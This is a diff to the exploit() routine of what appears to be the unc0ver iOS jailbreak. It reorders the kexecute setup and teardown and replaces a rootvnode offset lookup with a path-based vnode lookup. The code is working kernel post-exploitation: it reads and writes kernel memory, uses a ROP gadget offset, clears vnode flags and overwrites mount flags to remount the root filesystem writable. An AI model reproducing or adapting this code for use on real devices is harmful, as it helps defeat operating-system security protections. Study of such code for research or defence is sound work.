@@ -782,10 +782,6 @@ void exploit()
         SETOFFSET(add_x0_x0_0x40_ret, find_add_x0_x0_0x40_ret());
         LOG("add_x0_x0_0x40_ret = "ADDR"", GETOFFSET(add_x0_x0_0x40_ret));
         _assert(ISADDR(GETOFFSET(add_x0_x0_0x40_ret)), message, true);
-        SETMESSAGE(NSLocalizedString(@"Failed to find rootvnode offset.", nil));
-        SETOFFSET(rootvnode, find_rootvnode());
-        LOG("rootvnode = "ADDR"", GETOFFSET(rootvnode));
-        _assert(ISADDR(GETOFFSET(rootvnode)), message, true);
         SETMESSAGE(NSLocalizedString(@"Failed to find zone_map_ref offset.", nil));
         SETOFFSET(zone_map_ref, find_zone_map_ref());
         LOG("zone_map_ref = "ADDR"", GETOFFSET(zone_map_ref));
@@ -942,6 +938,17 @@ void exploit()
     UPSTAGE();
     
     {
+        // Initialize kexecute.
+        
+        LOG("Initializing kexecute...");
+        SETMESSAGE(NSLocalizedString(@"Failed to initialize kexecute.", nil));
+        init_kexecute();
+        LOG("Successfully initialized kexecute.");
+    }
+    
+    UPSTAGE();
+    
+    {
         // Remount RootFS.
         
         LOG("Remounting RootFS...");
@@ -954,12 +961,6 @@ void exploit()
         const char *thedisk = "/dev/disk0s1s1";
         if (snapshots == NULL) {
             close(rootfd);
-            // Initialize kexecute.
-            
-            LOG("Initializing kexecute...");
-            SETMESSAGE(NSLocalizedString(@"Failed to initialize kexecute.", nil));
-            init_kexecute();
-            LOG("Successfully initialized kexecute.");
             
             // Clear dev vnode's si_flags.
             
@@ -977,13 +978,6 @@ void exploit()
             _assert(si_flags == 0, message, true);
             _assert(_vnode_put(devVnode) == ERR_SUCCESS, message, true);
             LOG("Successfully cleared dev vnode's si_flags.");
-            
-            // Deinitialize kexecute.
-            
-            LOG("Deinitializing kexecute...");
-            SETMESSAGE(NSLocalizedString(@"Failed to deinitialize kexecute.", nil));
-            term_kexecute();
-            LOG("Successfully deinitialized kexecute.");
             
             // Mount system snapshot.
             
@@ -1033,7 +1027,7 @@ void exploit()
                 LOG("%s", *snapshot);
             }
         }
-        uint64_t rootfs_vnode = ReadKernel64(GETOFFSET(rootvnode));
+        uint64_t rootfs_vnode = getVnodeAtPath("/");
         LOG("rootfs_vnode = "ADDR"", rootfs_vnode);
         _assert(ISADDR(rootfs_vnode), message, true);
         uint64_t v_mount = ReadKernel64(rootfs_vnode + koffset(KSTRUCT_OFFSET_VNODE_V_MOUNT));
@@ -1046,6 +1040,7 @@ void exploit()
             _assert(runCommand("/sbin/mount", "-u", thedisk, NULL) == ERR_SUCCESS, message, true);
             WriteKernel32(v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_FLAG), v_flag);
         }
+        _assert(_vnode_put(rootfs_vnode) == ERR_SUCCESS, message, true);
         NSString *file = [NSString stringWithContentsOfFile:@"/.installed_unc0ver" encoding:NSUTF8StringEncoding error:nil];
         needStrap = (file == nil ||
                     (![file isEqualToString:@""] &&
@@ -1064,6 +1059,17 @@ void exploit()
         }
         close(rootfd);
         LOG("Successfully remounted RootFS.");
+    }
+    
+    UPSTAGE();
+    
+    {
+        // Deinitialize kexecute.
+        
+        LOG("Deinitializing kexecute...");
+        SETMESSAGE(NSLocalizedString(@"Failed to deinitialize kexecute.", nil));
+        term_kexecute();
+        LOG("Successfully deinitialized kexecute.");
     }
     
     UPSTAGE();
@@ -1269,7 +1275,6 @@ void exploit()
         dictionary[@"Smalloc"] = ADDRSTRING(GETOFFSET(smalloc));
         dictionary[@"AllProc"] = ADDRSTRING(GETOFFSET(allproc));
         dictionary[@"AddRetGadget"] = ADDRSTRING(GETOFFSET(add_x0_x0_0x40_ret));
-        dictionary[@"RootVnode"] = ADDRSTRING(GETOFFSET(rootvnode));
         dictionary[@"ZoneMapOffset"] = ADDRSTRING(GETOFFSET(zone_map_ref));
         dictionary[@"VfsContextCurrent"] = ADDRSTRING(GETOFFSET(vfs_context_current));
         dictionary[@"VnodeLookup"] = ADDRSTRING(GETOFFSET(vnode_lookup));
